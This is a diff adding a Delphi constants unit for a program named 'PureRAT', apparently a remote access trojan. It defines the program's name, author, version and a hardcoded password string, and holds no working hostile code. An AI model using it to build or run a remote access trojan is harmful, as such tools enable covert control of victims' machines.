@@ -1,0 +1,15 @@
+unit UnitConstants;
+
+interface
+
+const
+  PROGRAMNAME = 'PureRAT';
+  PROGRAMAUTHOR = 'wrh1d3';
+  PROGRAMVERSIONNUMBER = 'v10.3a';
+  PROGRAMVERSIONID = 'OPEN SOURCE';
+  PROGRAMINFOS = PROGRAMNAME + ' ' + PROGRAMVERSIONNUMBER + ' ' + PROGRAMVERSIONID;
+  PROGRAMPASSWORD = PROGRAMNAME + '²³¤¼½¾!@#$%¥' + PROGRAMAUTHOR;
+
+implementation
+
+end.
